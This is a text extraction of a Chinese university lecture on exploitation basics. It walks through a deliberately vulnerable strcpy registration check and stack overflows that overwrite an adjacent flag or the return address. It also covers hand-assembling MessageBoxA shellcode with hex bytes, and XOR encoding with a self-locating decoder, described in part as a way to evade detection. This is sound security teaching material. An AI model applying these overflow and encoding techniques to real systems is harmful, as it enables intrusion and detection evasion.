# Lecture06 漏洞利用基础 - 逐页文字版

> 说明：本文件由 PDF 文本层逐页抽取生成，用于核对覆盖；复习请优先看同目录下的“复习讲义”。

## 来源：lecture06-漏洞利用基础.pdf

### lecture06-漏洞利用基础.pdf / Page 1

第五章 漏洞利用
漏洞利用概念
覆盖临接变量示例
Shellcode代码植入示例
Shellcode编写
Shellcode编码

### lecture06-漏洞利用基础.pdf / Page 2

漏洞利用概念

### lecture06-漏洞利用基础.pdf / Page 3

漏洞、利用与破坏

### lecture06-漏洞利用基础.pdf / Page 4

漏洞利用概念

漏洞利用（exploit）是指针对已有的漏洞
根据漏洞的类型和特点而采取相应的技术方案
进行尝试性或实质性的攻击
Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用
有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞

### lecture06-漏洞利用基础.pdf / Page 5

Shellcode（壳代码）

Executable code intended to be used
as a payload for
exploiting a software vulnerability

### lecture06-漏洞利用基础.pdf / Page 6

Shellcode（壳代码）

Executable code intended to be used
as a payload for
exploiting a software vulnerability
为什么叫shellcode？
攻击者写入代码，
• 执行”/bin/sh”
• 打开一个命令行shell
• 获得远程控制权限

execve(“/bin/sh”, null, null)

### lecture06-漏洞利用基础.pdf / Page 7

Shellcode（壳代码）

Executable code intended to be used
as a payload for
exploiting a software vulnerability

Shellcode不一定要“开shell”
任何以注入方式获得非法权限的代码都可称为shellcode
•
•

启动命令行
反向连接

•
•

下载并执行恶意程序
读取敏感文件

### lecture06-漏洞利用基础.pdf / Page 8

漏洞利用的核心

漏洞利用的核心就是利用程序漏洞去劫持进程的控制权，实现控制流劫持，
以便执行植入的shellcode或者达到其它的攻击目的。
当攻击者掌握了被攻击程序的内存错误漏洞后，一般会考虑发起控制流劫持
攻击。早期的攻击通常采用代码植入的方式，通过上载一段代码，将控制转
向这段代码执行。在栈溢出漏洞的利用过程中，攻击的目的是淹没返回地址，
以便劫持进程的控制权，让程序跳转去执行shellcode。

### lecture06-漏洞利用基础.pdf / Page 9

Exploit的结构

要完成攻击，Exploit需要执行shellcode，但Exploit中并不仅是shellcode。
p Exploit要达到攻击目标，要做的工作更多，比如对应的触发漏洞、将控制
权转移到shellcode一般均不相同，而且他们通常独立于shellcode的代码。
p 能实现特定目标的Exploit的有效载荷，称为Payload。

### lecture06-漏洞利用基础.pdf / Page 10

Exploit, payload和shellcode关系

Exploit是指利用漏洞进行攻击的动作
Shellcode用来实现具体的功能
Payload除了包含shellcode之外，还需要考虑如何触发漏洞并让系统或者程序去执行shellcode

Exploit: 攻击方案
Payload: 送入的数据
Shellcode: payload中可能包含的一段机器码

### lecture06-漏洞利用基础.pdf / Page 11

导弹发射方案

弹头里的有效载荷

弹头里的炸药/印信

### lecture06-漏洞利用基础.pdf / Page 12

单选题

1分

触发漏洞、将控制权转移到目标程序的是

A

shellcode

B

exploit

C

payload

D

vulnerability
提交

### lecture06-漏洞利用基础.pdf / Page 13

覆盖临接变量示例

### lecture06-漏洞利用基础.pdf / Page 14

示例
一个系统的注册机验证过程漏洞如下：

#include <stdio.h>
#include <windows.h>
#define REGCODE "12345678"
int verify (char * code){
int flag;
char buffer[44];
flag=strcmp(code, REGCODE);
strcpy(buffer, code);
return flag;
}

### lecture06-漏洞利用基础.pdf / Page 15

示例
一个系统的注册机验证过程漏洞如下：

#include <stdio.h>
#include <windows.h>
#define REGCODE "12345678"
int verify (char * code){
int flag;
char buffer[44];
flag=strcmp(code, REGCODE);
strcpy(buffer, code);
return flag;
}

### lecture06-漏洞利用基础.pdf / Page 16

假设其主程序启动时候要校验注册码：
void main(){
int vFlag=0;
char regcode[1024];
FILE *fp;
LoadLibrary("user32.dll");
if (!(fp=fopen("reg.txt","rw+"))) exit(0);
fscanf(fp,"%s", regcode);
vFlag=verify(regcode);
if (vFlag)
printf("wrong regcode!");
else
printf("passed!");
fclose(fp);
}

### lecture06-漏洞利用基础.pdf / Page 17

你觉得代码可被利用做什么？

### lecture06-漏洞利用基础.pdf / Page 18

你觉得代码可被利用做什么？
1. 绕过密码验证
2. 恶意代码执行

### lecture06-漏洞利用基础.pdf / Page 19

你觉得代码可被利用做什么？
1. 绕过密码验证
2. 恶意代码执行

### lecture06-漏洞利用基础.pdf / Page 20

Verify函数的缓冲区

ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

栈溢出覆写

Buffer[40…43]机器码
Flag
EBP

前栈帧EBP
返回地址

高地址

### lecture06-漏洞利用基础.pdf / Page 21

Verify函数的缓冲区

ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码
Flag
EBP

栈溢出覆写
目标值是什么？

前栈帧EBP
返回地址

高地址

### lecture06-漏洞利用基础.pdf / Page 22

假设其主程序启动时候要校验注册码：
void main(){
int vFlag=0;
char regcode[1024];
FILE *fp;
LoadLibrary("user32.dll");
if (!(fp=fopen("reg.txt","rw+"))) exit(0);
fscanf(fp,"%s", regcode);
vFlag=verify(regcode);
if (vFlag)
printf("wrong regcode!");
else
printf("passed!");
fclose(fp);
}

### lecture06-漏洞利用基础.pdf / Page 23

假设其主程序启动时候要校验注册码：
void main(){
int vFlag=0;
char regcode[1024];
FILE *fp;
LoadLibrary("user32.dll");
if (!(fp=fopen("reg.txt","rw+"))) exit(0);
fscanf(fp,"%s", regcode);
vFlag=verify(regcode);

值为0
验证成功

if (vFlag)
printf("wrong regcode!");
else
printf("passed!");
fclose(fp);

}

### lecture06-漏洞利用基础.pdf / Page 24

漏洞利用：覆盖临接变量

利用目标：利用溢出覆盖临接变量，实现控制流劫持，完成软件破解。
只需要淹没flag状态位，使其变为0即可

如果能对reg.txt写入二进制数据，我们利用Ultraedit打开reg.txt，并在该文件中写入

### lecture06-漏洞利用基础.pdf / Page 25

Verify函数的缓冲区

ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码
Flag
EBP

栈溢出覆写
目标值是0

前栈帧EBP
返回地址

高地址

### lecture06-漏洞利用基础.pdf / Page 26

漏洞利用：覆盖临接变量

用下面的字符串填充buffer？

“123412341234123412341234123412341234123412340000”

11组4字节“1234”

多余4字节“0”

共44字节

溢出覆盖flag

### lecture06-漏洞利用基础.pdf / Page 27

漏洞利用：覆盖临接变量

误区
字符‘0’≠ 数值 0

flag值

### lecture06-漏洞利用基础.pdf / Page 28

漏洞利用：覆盖临接变量

误区

0x30303030
808464432 (10进制)

字符‘0’≠ 数值 0

flag值

### lecture06-漏洞利用基础.pdf / Page 29

漏洞利用：覆盖临接变量

可攻击字符串

“12341234123412341234123412341234123412341234”
44字节写满buffer

strcmp将flag值置1:

### lecture06-漏洞利用基础.pdf / Page 30

漏洞利用：覆盖临接变量

可攻击字符串

“12341234123412341234123412341234123412341234”
44字节写满buffer
多余1字节‘\0’溢出
覆盖flag低位1

strcmp将flag值置1:

溢出将flag值置0:

### lecture06-漏洞利用基础.pdf / Page 31

漏洞利用：覆盖临接变量

挑战：strcmp返回值可能为正数，但不是1
因此覆盖低位无效

### lecture06-漏洞利用基础.pdf / Page 32

漏洞利用：覆盖临接变量

挑战：strcmp返回值可能为正数，但不是1
因此覆盖低位无效
解法：buffer末尾写入4个‘\0’
可行吗？？？

### lecture06-漏洞利用基础.pdf / Page 33

漏洞利用：覆盖临接变量

挑战：strcmp返回值可能为正数，但不是1
因此覆盖低位无效
解法：buffer末尾写入4个‘\0’
可行吗？？？
strcpy在遇到第一个‘\0’后会停止

### lecture06-漏洞利用基础.pdf / Page 34

示例
假设我们已知一个系统的注册机验证过程的漏洞，程序举例如下：

#include <stdio.h>
#include <windows.h>
#define REGCODE "12345678"
44字节
+
NUL
+
NUL
+
NUL
+
NUL
int verify (char * code){
int flag;
char buffer[44];
flag=strcmp(code, REGCODE);
字节拷贝到此停止！
strcpy(buffer, code);
return flag;
}

### lecture06-漏洞利用基础.pdf / Page 35

你觉得代码可被利用做什么？
1. 绕过密码验证
2. 恶意代码执行

### lecture06-漏洞利用基础.pdf / Page 36

Shellcode代码植入

### lecture06-漏洞利用基础.pdf / Page 37

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码
Flag
EBP

前栈帧EBP
返回地址
高地址

### lecture06-漏洞利用基础.pdf / Page 38

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码

栈溢出覆写

Flag
EBP

前栈帧EBP
返回地址
高地址

### lecture06-漏洞利用基础.pdf / Page 39

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址
Verify函数栈帧
verify调用后
下条指令地址
Buffer[0…3]机器码
……
1

Buffer[40…43]机器码
Flag
EBP

前栈帧EBP
返回地址

取址执行指令
高地址

2

### lecture06-漏洞利用基础.pdf / Page 40

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码

覆写为buffer地址

Flag
EBP

前栈帧EBP
返回地址
高地址

### lecture06-漏洞利用基础.pdf / Page 41

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

Verify函数栈帧

而是机器指令
并且是恶意机器指令

Buffer[0…3]机器码
……

Buffer[40…43]机器码

覆写为buffer地址

Flag
EBP

不是普通字符

低地址

前栈帧EBP
返回地址
高地址

### lecture06-漏洞利用基础.pdf / Page 42

编写并植入shellcode

目标任务
植入一段代码，覆写返回地址
执行MessageBoxA函数，弹出窗体

### lecture06-漏洞利用基础.pdf / Page 43

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址
Verify函数栈帧

Buffer[0…3]机器码
……

Buffer[40…43]机器码

栈溢出覆写

Flag
EBP

前栈帧EBP
返回地址
高地址

至少写入
buffer（44字节）+
flag（4字节）+
前EBP值（4字节）
第53-56字节为
淹没地址

### lecture06-漏洞利用基础.pdf / Page 44

漏洞利用：代码植入
利用目标：利用溢出覆盖返回地址，转去执行植入的恶意程序。
ESP

低地址

如何调用

Verify函数栈帧

MessageBoxA？
Buffer[0…3]机器码
……

Buffer[40…43]机器码

覆写为buffer地址

Flag
EBP

前栈帧EBP
返回地址
高地址

### lecture06-漏洞利用基础.pdf / Page 45

汇编语言调用MessageBoxA

机器码不像C语言一样直接写函数名调用API
CPU只认识：地址、寄存器、压栈、跳转等

### lecture06-漏洞利用基础.pdf / Page 46

汇编语言调用MessageBoxA

1

确保user32.dll（动态链接库）已加载

MessageBoxA不在本程序中
它属于user32.dll这一Windows GUI库

### lecture06-漏洞利用基础.pdf / Page 47

汇编语言调用MessageBoxA

2

获得函数入口地址

找到MessageBoxA在内存中的地址

### lecture06-漏洞利用基础.pdf / Page 48

汇编语言调用MessageBoxA

3

准备参数

需要4个参数，从右向左压栈
MessageBoxA(NULL, "hello", "title", 0);

### lecture06-漏洞利用基础.pdf / Page 49

汇编语言调用MessageBoxA

1

确保user32.dll（动态链接库）已加载

MessageBoxA不在本程序中
它属于user32.dll这一Windows GUI库

### lecture06-漏洞利用基础.pdf / Page 50

汇编语言调用MessageBoxA

静态
动态
当前加载基址 函数在DLL中的
地址偏移

### lecture06-漏洞利用基础.pdf / Page 51

汇编语言调用MessageBoxA

运行时加载
地址

来自DLL导出表
(Export Table)

### lecture06-漏洞利用基础.pdf / Page 52

汇编语言调用MessageBoxA

具体如何获取？

### lecture06-漏洞利用基础.pdf / Page 53

获取函数入口地址
获取函数入口地址：MessageBoxA的入口地址可以通过user32.dll在系统中加载的基址和
MessageBoxA 在 库 中 的 偏 移 相 加 得 到 。 可 以 使 用 VC6.0 自 带 的 小 工 具 “ Dependency
Walker”获得这些信息，如下图所示。

函数偏移

0x77D10000

+
0x000407EA

=
0x77D507EA

DLL基址

### lecture06-漏洞利用基础.pdf / Page 54

获取函数入口地址

Call 0x77D507EA?
运行时动态查询
GetProcAddress()

### lecture06-漏洞利用基础.pdf / Page 55

获取函数入口地址

Call 0x77D507EA?
函数指针

运行时动态查询

去哪个DLL
找哪个函数

### lecture06-漏洞利用基础.pdf / Page 56

获取函数入口地址
#include <windows.h>
#include <stdio.h>
int main()
{
HINSTANCE LibHandle;
FARPROC ProcAdd;
LibHandle = LoadLibrary("user32");
运行左侧代码，可以得到
//获取user32.dll的地址
入口地址：0x 77D507EA
printf("user32 = 0x%x \n", LibHandle);
//获取MessageBoxA的地址
ProcAdd=(FARPROC)GetProcAddress(LibHandle,"MessageBoxA");
printf("MessageBoxA = 0x%x \n", ProcAdd);
getchar();
return 0;
}

### lecture06-漏洞利用基础.pdf / Page 57

把函数调用直接翻译成
可直接执行的机器码序列

### lecture06-漏洞利用基础.pdf / Page 58

1

在栈上构造字符串“westwest\0”

2

获取字符串首地址

3

按stdcall约定压入4个参数

4

调用MessageBoxA

### lecture06-漏洞利用基础.pdf / Page 61

第一步骤和后面是什么关系？
既然已经把“westwest”放到栈里了
为什么后面还要继续push？

### lecture06-漏洞利用基础.pdf / Page 62

第一步骤和后面是什么关系？
既然已经把“westwest”放到栈里了
为什么后面还要继续push？

前面压的是字符串内容
后面是字符串地址

### lecture06-漏洞利用基础.pdf / Page 63

四个参数

### lecture06-漏洞利用基础.pdf / Page 64

MessageBoxA地址

### lecture06-漏洞利用基础.pdf / Page 65

调用函数是从哪里找参数的？

在调用前的栈里，已压入参数

### lecture06-漏洞利用基础.pdf / Page 66

1

压入返回地址

2

跳转

3

建立调用函数栈桢

### lecture06-漏洞利用基础.pdf / Page 67

利用EBP相对偏移
找参数

### lecture06-漏洞利用基础.pdf / Page 68

第二步：编写函数调用的汇编代码
编写函数调用的汇编代码：先把字符串“westwest”压入栈区，消息框的文本和标题都显示为
“westwest”，只要重复压入指向这个字符串的指针即可；第1个和第4个参数这里都将设置为NULL。
机器代码（十六进制）
汇编指令
33 DB
XOR EBX,EBX
53
PUSH EBX
68 77 65 73 74
PUSH 74736577
68 77 65 73 74
PUSH 74736577
8B C4
MOV EAX,ESP
53
50
50
53
B8 EA 07 D5 77
FF D0

PUSH EBX
PUSH EAX
PUSH EAX
PUSH EBX
MOV EAX, 0x77D507EA
CALL EAX

注释
将EBX的值设置为0
将EBX的值入栈
将字符串west入栈
将字符串west入栈
将栈顶指针存入EAX（栈顶指针的值就是字符串的首地址）

从汇编指令到机器码

可用assembler
入栈Messagebox的参数-类型
（例如NASM）完成
入栈Messagebox的参数-标题
入栈Messagebox的参数-消息
入栈Messagebox的参数-句柄

本质上是一个查表过程
调用MessageBoxA函数，注意，每个机器的该函数的入口地
址不同，请按实际值写入。

### lecture06-漏洞利用基础.pdf / Page 69

第三步：注入Shellcode代码
得到的shellcode为：33 DB 53 68 77 65 73 74 68 77 65 73 74 8B C4 53 50 50 53 B8
EA 07 D5 77 FF D0。
将这段shellcode写入reg.txt文件，且在返回地址处写buffer的地址。
Buffer的地址可以通过OllyDbg来查看得到，也可以通过VC6的转到反汇编方式
来得到：0012FAF0。

### lecture06-漏洞利用基础.pdf / Page 70

Windows xp下静态API的地址是准的，
windows XP之后增加了ASLR保护机
制，地址就不准，就得动态获取了。

### lecture06-漏洞利用基础.pdf / Page 71

获取函数入口地址

Call 0x77D507EA?
不能直接写死地址

### lecture06-漏洞利用基础.pdf / Page 72

获取函数入口地址

Call 0x77D507EA?
不能直接写死地址
• ASLR
• 不同Windows版本
• 不同补丁版本

### lecture06-漏洞利用基础.pdf / Page 73

基于上述程序，编写shellcode，完成代码植入
Shellcode往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常还会受到
很多苛刻限制，故开发和调试的难度很高。

植入代码之前需要做大量的调试工作，例如：
1

弄清楚程序有几个输入点，这些输入将最终会当作哪个函数的
第几个参数读入到内存的那一个区域，哪一个输入会造成栈溢
出，在复制到栈区的时候对这些数据有没有额外的限制等；

2

调试之后还要计算函数返回地址距离缓冲区的偏移并淹没之;

3

选择指令的地址, 最终制作出一个有攻击效果的“承载”着
shellcode的输入字符串。

### lecture06-漏洞利用基础.pdf / Page 74

Shellcode编写挑战

• 长度受限
•

栈溢出空间有限

•

不能假设固定在某一地址

• 地址随机化
•

ASLR

• 坏字符

•

x86、x64、ARM、MIPS

•

‘\0’换行、空格等

• 稳定性
•

脱离调试环境

•

NX/DEP

• 位置无关

• 现代防护

• 跨平台

### lecture06-漏洞利用基础.pdf / Page 75

知识点四：Shellcode编写

### lecture06-漏洞利用基础.pdf / Page 76

Shellcode编写的难点
由于漏洞发现者在漏洞发现之初并不会给出完整Shellcode，因此掌握Shellcode
编写技术就显得尤为重要。但是，要编写Shellcode存在很多难点：

对一些特定字符需要转码。比如，
对于strcpy等函数造成的缓冲区溢出，
会认为NULL是字符串的终结，所以
shellcode中不能有NULL，如果有需
要则要进行变通或编码。

函数API的定位很困难。比如，在
Windows系统下，系统调用多数都是封装
在高级API中来调用的，而且不同的
Service Pack或版本的操作系统其API都可
能有所改动，所以不可能直接调用。因此，
需要采用动态的方法获取API地址。

### lecture06-漏洞利用基础.pdf / Page 77

简单的编写Shellcode的方法
一种简单的编写Shellcode的方法的步骤如下：
第一步：用c语言书写要执行的Shellcode
使用VC6编写程序如下：

#include <stdio.h>
#include <windows.h>
void main()
{
MessageBox(NULL,NULL,NULL,0);
return;
}

### lecture06-漏洞利用基础.pdf / Page 78

简单的编写Shellcode的方法
第二步 换成对应的汇编代码
利用调试功能，找到其对应的汇编代码：
直接得到的汇编语言通常需
要进行再加工。对于push 0
而 言 ， 可 以 通 过 上 述 的 xor
ebx ebx之后执行push ebx来
实现。

### lecture06-漏洞利用基础.pdf / Page 79

在工程中编写汇编语言如下：
#include <stdio.h>
#include <windows.h>
void main(){
LoadLibrary("user32.dll");//加载user32.dll
_asm
{
xor ebx,ebx
push ebx//push 0，push 0的机器代码会出现一个字节的0，对于直接利用需要解决字
节为0的问题，因此转换为push ebx

push ebx
push ebx
push ebx
mov eax, 77d507eah// 77d507eah是MessageBox函数在系统中的地址
call eax

}
return;
}

### lecture06-漏洞利用基础.pdf / Page 80

简单的编写Shellcode的方法
第三步 根据汇编代码，找到对应地址中的机器码
在汇编第一行代码处打断点，利用调试定位具体内存中的地址：
这样，在Memory窗口就可以
找到对应的机器码：33 DB 53
53 53 53 B8 EA 07 D5 77 FF D0。

### lecture06-漏洞利用基础.pdf / Page 81

接下来就可以利用这个Shellcode来实现漏洞的利用了，一个VC6测试程序如下：
#include <stdio.h>
#include <windows.h>
char ourshellcode[]="\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0";
void main()
{
LoadLibrary("user32.dll");
int *ret;
ret=(int*)&ret+2;
(*ret)=(int)ourshellcode;
return;
}
请某位同学来回答一下原理

### lecture06-漏洞利用基础.pdf / Page 82

构造任意字符串？“hello world” ASCII码为：\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x20
4字节存入，硬编码空格是0x20；入栈的话，需要倒着来；考虑bigendian编码，存储顺序也得倒过来。
利用寄存器？Mov ebx, 0x726C6400; push ebx

_asm
{

}

xor ebx,ebx
push ebx//push 0
push 20646C72h
push 6F77206Fh
push 6C6C6568h
mov eax, esp

push ebx//push 0
push eax
push eax
push ebx
mov eax, 77d507eah// 77d507eah这个是MessageBox函数在系统中的地址
call eax

### lecture06-漏洞利用基础.pdf / Page 83

知识点五：Shellcode编码

### lecture06-漏洞利用基础.pdf / Page 84

Shellcode编码必要性
Shellcode代码编制过程通常需要进行编码，因为：
Ø 字符集的差异。应用程序应用平台的不同，可能的字符集会有差异，限制
exploit的稳定性。
Ø 绕过坏字符。针对某个应用，可能对某些“坏字符”变形或者截断而破坏
exploit，比如strcpy函数对NULL字符的不可接纳性，再比如很多应用在某些
处理流程中可能会限制0x0D（\r）、0x0A（\n）或者0x20（空格）字符。
Ø 绕过安全防护检测。有很多安全检测工具是根据漏洞相应的exploit脚本特征
做的检测，所以变形exploit在一定程度上可以“免杀”。

### lecture06-漏洞利用基础.pdf / Page 85

Shellcode编码方法
网页Shellcode。对于网页Shellcode，可以采用base64编码。Base64是网络上最
常见的用于传输8Bit字节码的编码方式之一，是一种基于64个可打印字符来表
示二进制数据的方法。
二进制机器代码。对于二进制Shellcode机器代码的编码，通常采用类似“加壳”
思想的手段，采用：
① 自定义编码(异或编码、计算编码、简单加解密等)的⽅法完成shellcode的编

码；
② 通过精⼼构造 精简⼲练的解码程序 ，放在shellcode开始执⾏的地⽅，完成
shellcode的编解码；当exploit成功时，shellcode顶端的解码程序首先运⾏，
它会在内存中将真正的shellcode还原成原来的样⼦，然后执⾏。

### lecture06-漏洞利用基础.pdf / Page 86

异或编码
异或编码是一种简单易用的shellcode编码方法，它的编解码程序非常简单。
但是，它也存在很多限制，比如在选取编码字节时，不可与已有字节相同，否
则会出现0。
编码程序，是独立的。是在
生成shellcode的编码阶段使
用。将shellcode代码输入后，
输出异或后的shellcode编码。

void encoder(char* input, unsigned char key)
{
int i = 0, len = 0;
len = strlen(input);
unsigned char * output = (unsigned char *)malloc(len + 1);
for (i = 0; i<len; i++)
output[i] = input[i] ^ key;
……输出到文件中….

}
int main(){
char sc[]=“0xAE………………………0x90”;
encoder(sc, 0x44);
}

### lecture06-漏洞利用基础.pdf / Page 87

异或编码
解码程序是shellcode的一部分。下面的解码程序中，默认EAX在shellcode开始时
对准shellcode起始位置，程序将每次将shellcode的代码异或特定key（0x44）后
重新覆盖原先shellcode的代码。末尾，放一个空指令0x90作为结束符。
void main()
{
__asm
{
add eax, 0x14 ; 越过decoder记录shellcode起始地址,eax记录当前shellcode开始地址
xor ecx, ecx
decode_loop:
mov bl, [eax + ecx]
xor bl, 0x44
;用0x44作为key
mov [eax + ecx], bl
inc ecx
cmp bl, 0x90
;末尾放一个0x90作为结束符
jne decode_loop
}
}

### lecture06-漏洞利用基础.pdf / Page 88

获得代码当前指令地址
怎么让eax记录shellcode当前的起始地址？看如下代码。
#include <iostream>
using namespace std;
int main(int argc, char const *argv[])
Call会执行push EIP；
{
unsigned int temp;
EIP的值又是下一条指令pop EAX的地址
__asm{

call lable;
lable:
pop eax;

mov temp,eax;

}

}
cout <<temp <<endl;
return 0;

Pop Eax会将栈顶EIP（自身指令地
址）出栈，保存到EAX中

### lecture06-漏洞利用基础.pdf / Page 89

解码程序加上之前编码的shellcode形成最终完整的shellcode
int main(){
__asm {

EAX指向pop eax地址

call lable;
0x14à0X15
lable: pop eax;
add eax, 0x15
;越过decoder记录shellcode起始地址
xor ecx, ecx
decode_loop:
mov bl, [eax + ecx]
xor bl, 0x44
;用0x44作为key
mov [eax + ecx], bl
inc ecx
cmp bl, 0x90
;末尾放一个0x90作为结束符
jne decode_loop

}
}

return 0;

### lecture06-漏洞利用基础.pdf / Page 90

后面跟上任意的编码后的shellcode形成完整的可利用的shellcode
#include <stdio.h>
#include <windows.h>
char
ourshellcode[]="\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\
x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1\x77\x9f\x17\x2c\
x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\
x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4";
void main()
{
LoadLibrary("user32.dll");
int *ret;
ret=(int*)&ret+2;
(*ret)=(int)ourshellcode;
return;
}

### lecture06-漏洞利用基础.pdf / Page 91

单选题

下列不属于对Shellcode进行编码的原因的是

A

字符集差异

B

绕过安全检测

C

绕过坏字符

D

绕过返回地址
提交

